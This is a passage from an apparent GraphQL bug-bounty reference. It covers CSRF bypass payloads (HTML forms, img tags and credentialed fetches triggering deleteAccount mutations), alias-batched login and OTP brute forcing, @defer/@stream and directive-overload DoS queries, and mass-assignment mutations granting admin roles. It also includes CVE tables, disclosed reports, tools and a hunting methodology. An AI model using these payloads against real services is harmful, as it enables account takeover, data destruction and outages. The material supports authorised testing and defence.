2. **Prototype pollution via `map` keys (AIKIDO-2025-10884)** — `map: {"0": ["variables.__proto__.isAdmin"]}` writes uploaded value into `Object.prototype.isAdmin`. graphql-upload-minimal ≤1.6.1.
3. **CSRF via multipart upload (Apollo Server 2 <2.25.4, GHSA-2p3c-p3qw-69r4)** — AS2 CSRF protection skipped `multipart/form-data`. Mutation executes from attacker page.
4. **Content-Type smuggling** to land `.php`/`.aspx` — server validates `Content-Type: image/png` but not extension on disk.
5. **TOCTOU on Upload + filename** — mutation takes both; swap file between scan and rename via parallel requests.
6. **DoS via aliased upload flood** — N×100MB uploads in one mutation → OOM.
7. **SSRF via "fetch instead of upload" presigned-URL flows** — `fileUrl: String!` → server fetches → SSRF (EXNESS pattern).

---

## CSRF via GraphQL — Bypass Matrix (2024-2026)

| Vector | What goes wrong | Payload |
|---|---|---|
| `Content-Type: application/x-www-form-urlencoded` | CSRF check only on JSON | `<form method=POST enctype=application/x-www-form-urlencoded action=https://t/graphql><input name=query value="mutation{deleteAccount}"></form>` |
| `Content-Type: text/plain` w/ raw JSON | CORS treats as simple request | `fetch(url, {method:'POST', credentials:'include', headers:{'Content-Type':'text/plain'}, body:'{"query":"mutation{...}"}'})` |
| `Content-Type: multipart/form-data` | CSRF logic only on JSON path | Multipart form w/ `operations` field containing mutation JSON. Apollo Server 2 <2.25.4 (GHSA-2p3c-p3qw-69r4) |
| `GET /graphql?query=mutation{...}` | Some servers honor mutations via GET | `<img src="https://t/graphql?query=mutation%20{deleteAccount}">` — Doyensec 2021 finding still in 2024-2025 |
| `Content-Type: message/http` (XS-Search) | Chrome 2025 bug skipped CORS preflight when CT started with `message/` | GET with `message/http` → Apollo Server <5.5.0 runs query → time response to leak fields. GHSA-9q82-xgwf-vj6h, fixed @apollo/server 5.5.0 (Apr 2026) |
| GraphQL via WebSocket (CSWSH) | WS has no Origin check, cookies attach | `new WebSocket(...)` + `connection_init` + `subscribe` |
| GitLab GraphQL CSRF (CVE-2026-4922 / 3857) | Insufficient CSRF on `/api/graphql` w/ redirected origin | CVSS 8.1 — patched 18.9.6/18.10.4/18.11.1 (Feb/Mar 2026) |
| `application/graphql` Content-Type | Server registers MIME but skips CSRF | Test with simple-request fetch |
| graphql-yoga CSRF plugin only on declared mutations | Plugin checks operation `kind` after parse; hybrid `query M { __typename } mutation { delete }` may run both | Send hybrid document |

---

## Rate-Limit Bypass

**Alias batching** — 1000 login attempts in one request (per-request rate limit counts as one HTTP request)
```graphql
mutation BruteLogin {
  a1: login(email:"v@x.com", password:"a") { token }
  a2: login(email:"v@x.com", password:"b") { token }
  # ... a1000:
}
```

**JSON array batching** (when array form enabled — many Apollo deployments)
```json
[
  {"query":"mutation{login(email:\"v\",password:\"a\"){token}}"},
  {"query":"mutation{login(email:\"v\",password:\"b\"){token}}"}
]
```

**Operation-name variation** to bypass per-operation limits — `mutation login1 { login(...) }`, `mutation login2 { login(...) }`.

**Negative-cost query bypass** (Shopify pattern) — query-cost analyzer accepted negative-cost fields → total cost goes negative → bypasses budget.

**Custom scalars with `@cost(complexity:0)` accidentally on heavy resolvers** — alias × N, no cost accumulates.

**`@cache(ttl:0)`-style overrides** — attacker forces miss every request.

**Union/interface field counting** — analyzer counts `__typename` only, not resolved concrete type's nested cost.

**Variable-substituted multipliers** — `first: $n` and analyzer uses inline literal only; attacker uses variables with `$n = 99999`.

**Hive/Mesh `max-tokens` whitespace bypass** — spec ignores whitespace/comments/commas. WAF regex `__schema{` misses `__schema\t{`, `__schema #c\n {`, `__schema,{`.

### MFA/OTP brute via aliases — post-2024 disclosures

| Target | Pattern | Bounty |
|---|---|---|
| HackerOne `verifyAccountRecoveryPhoneNumber` | 1000× alias of SMS-trigger; per-request limit collapsed; SMS budget burn | **$12,500** (H1 #3287208) |
| HackerOne 2FA endpoint (Ibtissam Hammadi) | Race + GraphQL → 2FA disabled in 5s | (Medium) |
| Apollo Server v4 default-off | Cited explicit threat: "9999 mutations w/ permutations of 2FA codes" | n/a |
| PortSwigger lab "Bypassing GraphQL brute-force protections" | 100-alias `login` defeats per-request limit | Training |

**Post-Oct 2025 policy shift**: HackerOne tightened DoS-rule acceptance. Pure resource-exhaustion DoS now often $0 unless chained to paid-resource burn (SMS, OpenAI tokens, Lambda invocations, AWS Bedrock).

---

## DoS — `@defer`/`@stream`, Subscription, Regex

### `@defer`/`@stream` (incremental delivery spec — Apollo Server v4, Router, Yoga, Apollo Client 4.1)

```graphql
query Bomb {
  user(id:1) { name
    a1: posts @defer(label:"a1") { title author { name } }
    a2: posts @defer(label:"a2") { title author { name } }
    # ... ×1000 — each its own task/streaming context
  }
}

query Storm {
  largeList(first:10000) @stream(initialCount:0, label:"x") {
    a: heavyResolver
    b: heavyResolver   # alias amplification inside stream
  }
}
```

None of the major armor plugins count `@defer`/`@stream` selections toward depth/cost on first pass.

### Directive overload

CVE-2024-47614 (async-graphql), CVE-2023-49559 (gqlparser), Imperva's 1100-directive pattern — parsers allocate per directive BEFORE any limit fires:
```graphql
query { user { name @skip(if:false) @include(if:true) @skip(if:false) ... @defer @defer ×1000 } }
```

### Hot Chocolate parser StackOverflow (CVE-2026-40324)

40 KB nested-object document → `StackOverflowException` (uncatchable in .NET) → process kill. Pre-validation DoS bypasses MaxExecutionDepth, complexity analyzers, persisted-query allow-lists.

### Subscription floods
See Subscription Attack Playbook above; CVE-2026-35526 Strawberry unbounded subscribe.

### ReDoS in filter resolvers / scalars
Vulnerable shape: filter/search/regex field whose backend regex engine is NFA. `aaaa...aaaa!` against `^(a+)+$`. 2024 academic ReDoS survey: still rampant in Angular, Langflow, Kubeflow, Hugging Face Transformers (CVE-2024-12720).

### JSON/Date/custom scalar coercion DoS
- `JSON` scalar that calls `JSON.parse` on huge/deeply-nested string
- `Date`/`DateTime` scalar w/ `new Date(userString)` or `moment(userString)` (moment ReDoS)
- Custom `Email`/`URL` scalars regex-validate

---

## Information Disclosure

- **Introspection on production** — even when "blocked":
  - GET vs POST inconsistency (POST blocks, GET allows)
  - WebSocket subscription channel (Nuri pattern)
  - Different vhost (`/api/graphql` blocks, `/internal/graphql` allows)
  - WSS subscription protocol init
  - `_service { sdl }` federation auto-field
- **Field-suggestion errors** — Apollo + Yoga default-emit "did you mean…" — reconstruct schema via Clairvoyance / InQL v6.1.0 brute-force
- **Unused/deprecated fields still queryable** — `@deprecated` only hides from docs
- **Debug fields in production** — `_debug`, `_internal`, `_admin` on common types
- **GraphQL logs leak args** (GitLab CVE-2024-12292) — mutations carry secrets in args, request body logged verbatim
- **Cross-account/-tenant reads** — `dashboard(id:)` without tenant scoping (New Relic pattern)

---

## Mutation Chaining

**Mass-assignment via undocumented input fields (Cloverleaf pattern)** — resolver auto-merges full input object even if schema lists only `{id, name}`. Always test extra fields:
```graphql
mutation CreateUser {
  createUser(input: {
    email:"evil@x.com", password:"ChangeMe!",
    role:"admin", isVerified:true, organizationId:1,
    alias:"victim-org", slug:"...", is_admin:true, permissions:["*"], parent_id:1, tenant_id:1
  }) { id role }
}
```

**Update-then-act in single request**
```graphql
mutation {
  bumpRole: updateUserRole(userId:1, role:ADMIN) { success }
  adminAction: deleteCompany(id:999) { success }
}
```

---

## CVE Quick Reference (2024-2026)

### Apollo ecosystem
| CVE | CVSS | Product | Class |
|---|---|---|---|
| CVE-2024-28101 | High | Apollo Router | Compressed-payload DoS post-decompression |
| CVE-2024-32971 | — | Apollo Router 1.44.0/1.45.0 | Query-plan-cache cross-contamination |
| CVE-2024-43783 | High | Apollo Router 1.21.0–1.52.1 | Coprocessor unlimited body OOM |
| CVE-2025-31496 | 7.5 | Apollo Compiler <1.27.0 | Exponential fragment processing validator |
| CVE-2025-32032 / 32034 | 7.5 | Apollo Router <1.61.2 | Query-planner fragment expansion exhausts thread pool |
| CVE-2025-32033 | 7.5 | Apollo Router <1.61.2 | u32 integer overflow disables ALL operation limits |
| CVE-2025-59845 | 8.2 | Apollo Embedded Sandbox / Explorer | postMessage CSRF (no origin validation) |
| CVE-2025-64172 | 7.5 | Apollo Federation <2.9.5/2.10.4/2.11.5/2.12.1 | `@requires`/`@fromContext` skip auth directives |
| CVE-2025-64173 | High | Apollo Router <1.61.12 | Polymorphic-type auth failure → unauth read |
| CVE-2025-64347 | High | Apollo Router <1.61.12 / 2.8.1-rc.0 | Renamed `@authenticated`/`@requiresScopes`/`@policy` silently not enforced |
| CVE-2025-64530 | 7.5 | Apollo Federation | Interface directives ignored when query uses implementing-type fragment |
| CVE-2026-32621 | High | Apollo Federation <2.9.6/2.10.5/2.11.6/2.12.3/2.13.2 | Prototype pollution via alias/variable names |
| GHSA-9q82-xgwf-vj6h | Low | Apollo Server <5.5.0 | `message/http` Content-Type XS-Search read-only CSRF (browser bug) |
| GHSA-733v-p3h5-qpq7 | — | graphql-armor-cost-limit ≤2.4.0 | `__schema`-named op/fragment → cost=0 |
| GHSA-224p-v68g-5g8f | — | graphql-armor-max-depth ≤2.4.1 | Fragment-cache poisoning |
| GHSA-2p3c-p3qw-69r4 | — | Apollo Server 2 <2.25.4 | graphql-upload multipart CSRF |
| GHSA-hx78-272p-mqqh | — | graphql-shield <6.0.6 | `no_cache` insecure hash → cache collision auth bypass |

### Server libraries
| CVE | CVSS | Product | Class |
|---|---|---|---|
| CVE-2025-27407 | 9.0+ | graphql-ruby various | `from_introspection` / `Schema::Loader.load` `instance_eval`/`class_eval` RCE |
| CVE-2024-40094 | 5.3 | graphql-java <21.5 | ENF introspection DoS bypasses pre-existing DoS guard |
| CVE-2024-47082 | Med | strawberry-graphql <0.243.0 | Django CSRF middleware EXEMPTED on multipart upload |
| CVE-2025-22151 | Med | strawberry-graphql 0.182.0–<0.257.0 | Relay node resolver returns wrong type → cross-type info disclosure |
| CVE-2026-35523 | 7.5 | strawberry-graphql ≤0.312.2 | Legacy `graphql-ws` accepts `start` without `connection_init` → auth skipped |
| CVE-2026-35526 | High | strawberry-graphql ≤0.312.2 | Unbounded WebSocket subscriptions per connection |
| CVE-2024-47614 | 8.7 | async-graphql (Rust) <7.0.10 | Directive-count overload |
| GHSA-4rx6-g5vg-5f3j | — | Juniper ≤0.15.9 | Circular named-fragment recursion |
| CVE-2023-49559 | — | gqlparser <2.5.15 / gqlgen <0.17.49 | Directive-count overload (still in 2024-2026 forks) |
| CVE-2024-50312 | 6.9 | graph-gophers/graphql-go | Introspection access-control bypass |
| CVE-2024-39895 | High | Directus <10.12.0 | Field-duplication DoS via aliases |
| CVE-2024-54151 | — | Directus | WebSocket GraphQL admin bypass when `WEBSOCKETS_GRAPHQL_AUTH=public` |
| CVE-2025-31481 | High | api-platform/core <3.4.17/4.0.22 | Relay `node(id:)` bypasses operation `security` attribute |
| CVE-2026-40324 | Critical | Hot Chocolate <12.22.7/13.9.16/14.3.1/15.1.14 | Parser StackOverflow pre-validation, bypasses ALL post-parse defenses |
| CVE-2026-23735 | Med | graphql-modules | `@ExecutionContext` race — session/token bleed across concurrent requests |

### Hosted/enterprise platforms
| CVE | CVSS | Product | Class |
|---|---|---|---|
| GHSA-g7mj-g7f4-hgrg | High | Hasura v2.10.0–v2.15 | `update_many` row-level auth bypass |
| CVE-2024-4994 | — | GitLab 16.1–17.1.1 | CSRF on `/api/graphql` |
| CVE-2024-8635 | — | GitLab EE | Maven Dependency Proxy custom URL SSRF |
| CVE-2024-12292 | — | GitLab | Sensitive params in GraphQL logs |
| CVE-2025-3922 | High | GitLab CE 12.4–<18.9.6 | Authenticated resource-exhaust DoS |
| CVE-2025-8014 | High | GitLab CE/EE | Complexity-limit bypass DoS |
| CVE-2025-10004 | High | GitLab CE/EE | Unauthenticated large-blob DoS |
| CVE-2025-11340 | 7.7 | GitLab EE 18.3–18.4.2 | `read_api`-scoped token → write on vulnerability records |
| CVE-2025-11447 | High | GitLab CE/EE <18.3.5/18.4.3/18.5.1 | Unauth JSON-validation DoS |
| CVE-2025-12575 | — | GitLab EE | Auth'd unauthorized internal-network requests |
| CVE-2025-14592 | High | GitLab GLQL API | `projectUpdate` mutation in private namespaces |
| CVE-2026-4922 / CVE-2026-3857 | 8.1 | GitLab 17.0→18.9.5 | GraphQL CSRF — patched 18.9.6/18.10.4/18.11.1 |
| CVE-2025-59358 | 7.5 | Chaos Mesh <2.7.3 | Unauth GraphQL debug server on :10082 |
| CVE-2025-59359/60/61 | 9.8×3 | Chaos Mesh | Mutations terminate processes / OS cmd injection in `cleanTcs`/`killProcesses`/`cleanIptables` — K8s cluster takeover |
| CVE-2025-9572 | — | Foreman/Satellite GraphQL | Taxonomy-scope check missing on resolver |
| CVE-2026-34976 | 10.0 | Dgraph ≤25.3.0 | `restoreTenant` mutation omitted from auth middleware → unauth DB overwrite, file://, SSRF |
| CVE-2026-40173 | High | Dgraph | `/debug/pprof/cmdline` unauth → admin token disclosure |
| CVE-2025-43796 | 7.1 | Liferay Portal / DXP | GraphQL no page-size limit → DoS |
| CVE-2025-53364 | — | Parse Server 5.3.0–<7.5.3 / 8.0.0–<8.2.2 | Anonymous GraphQL introspection |
| CVE-2024-37843 | 9.8 | Craft CMS ≤3.7.31 | Unsanitized arg → SQL injection |
| CVE-2025-68437 | — | Craft CMS | GraphQL `save_*_Asset` `_file.url` SSRF (DNS-rebinding bypass on initial patch) |
| CVE-2024-34102 | 9.8 | Adobe Commerce/Magento ("CosmicSting") | XXE reachable via REST/GraphQL/SOAP |
| CVE-2025-54236 | 9.1 (KEV) | Adobe Commerce/Magento ("SessionReaper") | Nested deserialization → session takeover → RCE via REST/GraphQL/SOAP |
| CVE-2025-68604 | Med | WPGraphQL ≤2.5.3 | CSRF |
| CVE-2026-33290 | Med-High | WPGraphQL <2.10.0 | `updateComment` skips `moderate_comments` capability |
| CVE-2026-27938 | — | WPGraphQL <2.9.1 | release.yml GitHub Actions injection |
| CVE-2025-67976 | High | WPGraphQL Smart Cache <2.0.1 | Sensitive data exposure |
| CVE-2025-3930 et al. | — | Strapi v4/v5 <5.24.2/4.25.24 | GraphQL JWT not invalidated after logout/deactivation |
| CVE-2026-27886 | — | Strapi | GraphQL sensitive-data leak via relational filtering |
| CVE-2024-39338 / CVE-2025-23061 / GHSA-vg7j-7cwx-8wgw | — | Mongoose | Nested `$where` injection bypass |
| AIKIDO-2025-10884 | — | graphql-upload-minimal ≤1.6.1 | Prototype pollution via multipart `map` field |

---

## Disclosed Reports — 2024-2026 New Entries

| # | Title | Program | Bounty | Permalink |
|---|---|---|---|---|
| 1 | DOS via Mutation Aliasing in Account Recovery (`verifyAccountRecoveryPhoneNumber`) | HackerOne | **$12,500** | https://hackerone.com/reports/3287208 |
| 2 | IDOR — Delete all Licenses via CreateOrUpdateHackerCertification | HackerOne | **$12,500** | TOP H1 GraphQL list |
| 3 | Facebook Page admin email disclosure via single GraphQL query | Meta | **$15,000** | https://medium.com/@vivekps143/how-a-simple-graphql-query-exposed-facebook-page-admins-and-their-personal-emails-a-15-000-bug-e76f2ff8fd5e |
| 4 | GraphQL Misconfiguration Exposed Sensitive Info on private programs | Undisclosed | **$25,000** | https://cyberw1ng.medium.com/how-a-graphql-misconfiguration-exposed-sensitive-information-a-25-000-bug-bounty-report-a8207bc7ff11 |
| 5 | Chaos Mesh `cleanTcs` OS cmd injection (CVE-2025-59359) | Chaos Mesh | $0 (OSS, CVSS 9.8) | https://jfrog.com/blog/chaotic-deputy-critical-vulnerabilities-in-chaos-mesh-lead-to-kubernetes-cluster-takeover/ |
| 6 | Chaos Mesh `killProcesses` OS cmd injection (CVE-2025-59360) | Chaos Mesh | $0 (CVSS 9.8) | same |
| 7 | Chaos Mesh `cleanIptables` OS cmd injection (CVE-2025-59361) | Chaos Mesh | $0 (CVSS 9.8) | same |
| 8 | Chaos Mesh unauth GraphQL debug server (CVE-2025-59358) | Chaos Mesh | $0 (CVSS 7.5) | same |
| 9 | api-platform Relay `node` auth bypass (CVE-2025-31481) | api-platform/core | $0 (OSS) | https://github.com/api-platform/core/security/advisories/GHSA-cg3c-245w-728m |
| 10 | graphql-ruby RCE via `Schema.from_introspection` (CVE-2025-27407) | graphql-ruby | $0 (CVSS 9.0) | https://rubysec.com/advisories/CVE-2025-27407/ |
| 11 | Apollo Router DoS via repeated named fragments (CVE-2025-32032) | Apollo Router | $0 (CVSS 7.5) | https://github.com/apollographql/router/security/advisories/GHSA-3j43-9v8v-cp3f |
| 12 | Apollo Router named-fragment expansion (CVE-2025-32034) | Apollo Router | $0 | https://github.com/apollographql/router/security/advisories/GHSA-75m2-jhh5-j5g2 |
| 13 | Apollo Compiler named-fragment validation DoS (CVE-2025-31496) | Apollo Compiler | $0 | https://www.ameeba.com/blog/cve-2025-31496-graphql-query-vulnerability-in-apollo-compiler-leading-to-possible-denial-of-service/ |
| 14 | Apollo Studio Embeddable Explorer/Sandbox CSRF (CVE-2025-59845) | Apollo | $0 | https://www.ameeba.com/blog/cve-2025-59845-csrf-vulnerability-in-apollo-studio-embeddable-explorer-embeddable-sandbox/ |
| 15 | Apollo Router compressed-payload DoS (CVE-2024-28101) | Apollo Router | $0 | https://securityvulnerability.io/vulnerability/CVE-2024-28101 |
| 16 | GitLab GraphQL crafted-blob unauth DoS (CVE-2025-10004) | GitLab | $0 | https://zeropath.com/blog/cve-2025-10004-gitlab-graphql-dos-summary |
| 17 | GitLab JSON-validation DoS (CVE-2025-11447) | GitLab | $0 | https://zeropath.com/blog/gitlab-cve-2025-11447-graphql-json-dos-summary |
| 18 | GitLab EE `read_api` → write BFLA (CVE-2025-11340) | GitLab EE | $0 | https://zeropath.com/blog/cve-2025-11340-gitlab-graphql-authorization-brief |
| 19 | GitLab GraphQL Authenticated DoS (CVE-2025-3922) | GitLab | $0 | https://www.sentinelone.com/vulnerability-database/cve-2025-3922/ |
| 20 | GitLab Complexity Bypass DoS (CVE-2025-8014) | GitLab | $0 | https://zeropath.com/blog/cve-2025-8014-gitlab-graphql-dos-summary |
| 21 | GitLab CSRF (CVE-2024-4994) → arbitrary mutations | GitLab | $0 | https://feedly.com/cve/vendors/gitlab |
| 22 | GitLab GraphQL log info disclosure (CVE-2024-12292) | GitLab | $0 | https://vulert.com/vuln-db/CVE-2024-12292 |
| 23 | OpenShift Console GraphQL introspection (CVE-2024-50312) | OpenShift | $0 | https://github.com/advisories/GHSA-7f25-p8gc-hxqh |
| 24 | OpenShift Console batching DoS (CVE-2024-50311) | OpenShift | $0 | https://nvd.nist.gov/vuln/detail/CVE-2024-50311 |
| 25 | Parse Server anonymous introspection (CVE-2025-53364) | Parse Server | $0 | https://github.com/parse-community/parse-server/security/advisories/GHSA-48q3-prgv-gm4w |
| 26 | Adobe Commerce/Magento SessionReaper (CVE-2025-54236) → RCE via GraphQL | Adobe | private (KEV) | https://threatprotect.qualys.com/2025/10/24/adobe-magento-improper-input-validation-vulnerability-exploited-in-attack-cve-2025-54236/ |
| 27 | Adobe Commerce CosmicSting XXE (CVE-2024-34102) via GraphQL | Adobe | private | https://github.com/jakabakos/CVE-2024-34102-CosmicSting-XXE-in-Adobe-Commerce-and-Magento |
| 28 | Craft CMS GraphQL SQL injection (CVE-2024-37843) | Craft CMS | $0 | https://www.tenable.com/cve/CVE-2024-37843 |
| 29 | WPGraphQL `updateComment` moderation bypass (CVE-2026-33290) | WPGraphQL | $0 | https://freshysites.com/security-bulletins/wordpress-security-bulletin-wpgraphql-vulnerability-cve-2026-33290/ |
| 30 | WPGraphQL release.yml GitHub Actions injection (CVE-2026-27938) | WPGraphQL | $0 | https://freshysites.com/resources/wordpress-security-bulletin-wpgraphql-cve-2026-27938/ |
| 31 | WPGraphQL Smart Cache data exposure (CVE-2025-67976) | WPGraphQL | $0 | https://wpsecurityninja.com/wordpress-vulnerabilities-database/ |
| 32 | IBM WebSphere graphql-java DoS (CVE-2024-40094) | IBM WAS | $0 | https://www.ibm.com/support/pages/security-bulletin-ibm-websphere-application-server-liberty-vulnerable-denial-service-due-graphql-java-cve-2024-40094 |
| 33 | Sorare circular-introspection DoS | Sorare | $0 | https://hackerone.com/reports/2048725 |
| 34 | Cloverleaf GraphQL mass-assignment via `alias` field → subdomain takeover | Cloverleaf | n/d | https://medium.com/@maakthon/bug-bounty-findings-10-major-vulnerabilities-exposed-in-cloverleafs-application-bac-in-graphql-0ae1ee0eb4d5 |
| 35 | Cloverleaf GraphQL private-user-data over-fetch | Cloverleaf | n/d | same |
| 36 | Legal-templates `/graphql-ws` IDOR → PostgreSQL error-based SQLi → PII | Undisclosed | **$2,000** | https://medium.com/@DarkyOS/sql-injection-in-graphql-websocket-escalated-to-pii-document-leak-09ba7ad2800a |
| 37 | GraphQL `UpdateMembership` self-permission escalation | Undisclosed SaaS | n/d | https://medium.com/@bassemwanies2002/from-manage-members-to-full-admin-privilege-escalation-in-a-graphql-api-b58699829d6e |
| 38 | Reflected XSS in JSON/GraphQL POST `search(keyword:)` | Bank.example.com | **~$10,000** | https://medium.com/@zoningxtr/how-i-discovered-hidden-json-graphql-requests-and-won-a-10-000-bug-bounty-dc0d72b4aba4 |
| 39 | Hidden `searchTransactions(filter:)` GraphQL SQLi | Fintech | $2,500–$10k+ | https://medium.com/@ProwlSec/top-bugs-that-actually-paid-bounties-in-2025-871eb0874400 |
| 40 | Unauth admin profile disclosure via GraphQL IDOR (`GetProfileInfo(username:)`) | Undisclosed | High (H1 7.5) | https://medium.com/@yasser0hamoda1/unauthenticated-admin-profile-disclosure-via-graphql-idor-a-real-world-bug-bounty-find-f8647eae5237 |
| 41 | E-commerce `Register`+`CreateAdminUser` unauth mutations | E-commerce | n/d | https://www.hackerone.com/blog/how-graphql-bug-resulted-authentication-bypass |
| 42 | Stored XSS to ATO via GraphQL API | Live Hacking Event | paid | https://www.pmnh.site/post/witeup_lhe_graphql_stored_xss/ |
| 43 | GraphQL `allTicks` source-URL SSRF → internal recon | private | **$3,000** | https://medium.com/@zerodaystories/this-simple-graphql-ssrf-bug-earned-me-3-000-3-30-days-9bd13e2c2f9d |
| 44 | Salt Security — fintech B2B GraphQL nested-auth flaws → cross-customer fund transfer + PII | Undisclosed fintech | n/d | https://www.prnewswire.com/news-releases/salt-security-discovers-graphql-authorization-flaws-in-fintech-saas-platform-301440052.html |
| 45 | Day[0] $600 simple MFA bypass with GraphQL | n/d | $600 | https://podcasters.spotify.com/pod/show/dayzerosec/episodes/Buggy-Browsers--Heap-Grooming--and-Broken-RSA-es2bmf |

### Historical reports (still relevant patterns from the original ~50)
- HackerOne H1 #435066 SQLi via `embedded_submission_form_uuid`
- HackerOne H1 #2207248 Shopify BillingDocument IDOR ($5,000)
- HackerOne H1 #2122671 HackerOne CreateOrUpdateHackerCertification IDOR ($12,500)
- HackerOne H1 #2216036/#2357443 GitHub REST↔GraphQL race conditions
- HackerOne H1 #1864188 EXNESS SSRF in GraphQL query ($3,000)
- HackerOne H1 #481518 Shopify negative-cost rate-limit bypass
- HackerOne H1 #862835 Nuri WebSocket introspection
- HackerOne H1 #3452015 Enjin operation-name bypass
- HackerOne H1 #447930 HackerOne UUID enumeration via node interface
- HackerOne H1 #984965 TikTok AddRulesToPixelEvents cross-tenant IDOR
- HackerOne H1 #1066203 Stripe UpdateAtlasApplicationPerson cross-tenant IDOR
- HackerOne H1 #885835 Twitter/X private list members via GraphQL timing
- HackerOne H1 #1085546 Shopify productUpdate stored XSS ($1,600)
- HackerOne H1 #981472 Shopify undocumented `fileCopy` ($2,000)
- HackerOne H1 #1711938 GitHub Apps user-to-server token abuse on Project V2 GraphQL

---

## Bounty Bracket Analysis (2024-2026)

**$250–$1k starvation work (often $0 in 2026)**:
- Introspection on production with no follow-up (Shopify always rejects)
- Single-account self-DoS via depth/alias (post-Oct 2025 HackerOne policy)
- Schema-suggestion info leak without follow-up
- Stack-trace disclosure from un-handled GraphQL field type

**$1k–$5k working range**:
- Intra-tenant IDOR (Cloverleaf-pattern)
- Stored XSS via GraphQL mutation in lower-privilege rendering
- SQLi/NoSQLi blind, no extracted impact
- Non-critical mass-assignment (rename via `displayName`)
- WPGraphQL caps bypass (CVE-2026-33290 = CVSS 4.3)
- WebSocket IDOR + SQLi chain ($2k legal-templates pattern)

**$5k–$15k clear impact**:
- Cross-tenant IDOR on `node(id:)`/Relay node — Shopify $5k, Stripe, TikTok pattern
- Cross-user PII exposure unauth — Yasser Hamoda H1/7.5, fintech writeups
- BFLA / privilege escalation — UpdateMembership chain; Facebook Page admin email $15k at boundary
- HackerOne $12.5k CreateOrUpdateHackerCertification IDOR
- HackerOne $12.5k DOS via Mutation Aliasing

**$15k+ elite**:
- Pre-auth RCE via GraphQL — Chaos Mesh CVE-2025-59359/60/61 CVSS 9.8 (OSS), equivalent on paid program → $15k+
- Cross-account ATO chains
- NDA-class data exposure on bug-bounty platform — $25k Cyberw1ng (2025 high-water mark)
- Federation gateway compromise (Apollo Router) → cross-subgraph data — no public disclosure yet but the chain primitive exists (CVE-2025-32032 + auth bypass → $30k+)

**What turns $1k into $25k**:
1. Data class > technique novelty (boring IDOR over critical data > clever blind SSTI on public data)
2. Cross-tenant = 10× bonus; cross-account = 100× bonus
3. Unauth precondition = 3-5× multiplier
4. Chain to RCE / ATO
5. Bypass of existing protection vendor already implemented (proves patch broken)
6. Reproducible curl PoC showing live secret output

**Meta SSRF/GraphQL cap**: $40,000 per Meta bounty policy.

---

## Tools (2024-2026)

| Tool | Update | What's new |
|---|---|---|
| **InQL v6.1.0** (Doyensec, Dec 2025) | Schema brute-forcer (did-you-mean abuse), engine fingerprinter, auto-variable generation, performance rewrite | https://blog.doyensec.com/2025/12/02/inql-v610.html |
| **InQL v5** (Doyensec, Aug 2023) | Kotlin rewrite, GQLSpection-based POI scanner, GraphiQL/Voyager embeds | https://blog.doyensec.com/2023/08/17/inql-v5.html |
| **graphql-cop v1.15/v1.16** (Dolev Farhi, Nov 2024) | Alias overloading, directive overloading, batching, circular queries, GET-method checks; prints reproducer curl per finding | https://github.com/dolevf/graphql-cop |
| **graphw00f v1.2.x** (Apr 2025) | Ballerina-GraphQL fingerprint, GET-based API support, Inigo signature, cross-references GraphQL Threat Matrix | https://github.com/dolevf/graphw00f |
| **PortSwigger GraphQL Security Tester** (2025 BApp) | Uses Burp's Montoya AI; generates malicious-variant queries for SQLi/authz/DoS/info-disclosure | https://portswigger.net/bappstore/bd98c38519144301a0a232d8e7df613c |
| **Clairvoyance / Clairvoyancex** | Active 2024-25; httpx + async fork available | https://github.com/nikitastupin/clairvoyance |
| **Caido GraphQL-Analyzer** | Plugin for Caido (Caido v0.51 backend plugins can issue GraphQL calls; v0.52 Plugin Store) | https://github.com/caido-community/GraphQL-Analyzer |
| **graphquail** (Forces Unseen) | Burp extension GraphQL toolkit | https://github.com/forcesunseen/graphquail |
| **AutoGQL** (FWDSEC) | Burp Pro plugin auto-feeds entire schema into Burp active scanner | https://github.com/FWDSEC/burp-auto-gql |
| **StackHawk HSTE / HawkScan 4.0** (2024-25) | Multi-profile scanning for BOLA/BFLA via different auth profiles; first-class introspection + file-schema config | https://docs.stackhawk.com/changelog.html |
| **42Crunch GraphQL Audit** (Jul 2025) | Removed custom-scalar requirement; 200+ checks | https://docs.42crunch.com/latest/content/whatsnew/42crunch-platform-2025-07-02.htm |
| **Akto** (2025) | 1000+ custom tests, traffic-replay for GraphQL, shadow-API detection | https://www.akto.io/blog/dast-tools |
| **graphql-armor** (Escape, defensive) | Versions 3.1.6+ patch cost-limit + max-depth bypasses; useful to know what it doesn't catch | https://escape.tech/graphql-armor/ |
| **escape.tech DAST + GraphQL scanner** | Commercial; "awesome-graphql-security" canonical list | https://github.com/Escape-Technologies/awesome-graphql-security |
| **Damn Vulnerable GraphQL App (DVGA)** | Maintained training target — Beginner + Expert game modes | https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application |
| **GraphQLer** (arXiv 2504.13358, Apr 2025) | Context-aware GraphQL fuzzer chaining queries/mutations via dependency graph; +35-84% coverage | https://arxiv.org/abs/2504.13358 |
| **PrediQL** (arXiv 2510.10407, Oct 2025) | LLM-guided RAG fuzzer w/ multi-armed bandit strategy selection | https://arxiv.org/abs/2510.10407 |
| **BatchQL** (Assetnote) | Canonical batching-attack toolkit | https://www.assetnote.io/resources/research/exploiting-graphql |
| **GraphQLmap** | Scripting/exploitation framework | https://github.com/swisskyrepo/GraphQLmap |
| **CrackQL** | Password brute via GraphQL aliases | https://github.com/nicholasaleks/CrackQL |
| **gql-cli** | CLI client | `gql-cli https://t/graphql < query.graphql` |
| **GQLSpection** | Parse introspection → generate all possible queries | `python3 gqlspection -s schema.json -o queries.txt` |

---

## Hunting Methodology (revised for 2026)

**Phase 1 — Discovery & fingerprint**
1. Probe `{__typename}` to confirm GraphQL
2. `graphw00f -t URL -d -f` for server engine
3. InQL v6.1.0 in Burp for engine fingerprint + schema brute-force (if introspection blocked)
4. List all alt paths (`/api/graphql`, `/internal/graphql`, `/staff/graphql`, `/v2/graphql`)
5. Check JS bundles for hardcoded operations, persisted-query hashes, federation hints
6. WebSocket: `wscat -c wss://t/graphql -s graphql-transport-ws`

**Phase 2 — Schema reconstruction**
1. Try standard introspection (full IntrospectionQuery)
2. If blocked: `{_service{sdl}}` federation auto-field
3. If blocked: targeted `__type(name:)` queries
4. If blocked: WS subscription introspection (Nuri pattern)
5. If blocked: field-suggestion brute-force (Clairvoyance / InQL v6.1.0)
6. APQ register-on-first-use: SHA-256 your queries and pre-load via APQ to bypass query-body WAF

**Phase 3 — Authorization testing (highest paying)**
1. Enumerate all `id:`-accepting fields with low + high privilege tokens
2. Try Relay `node(id:)` against every type — api-platform CVE-2025-31481 pattern
3. Cross-tenant: org_id/tenant_id/workspace_id swap across BOTH read and write
4. BFLA: every admin mutation with low-priv token
5. Scope confusion: `read_api`/`viewer` token → write mutations (GitLab CVE-2025-11340)
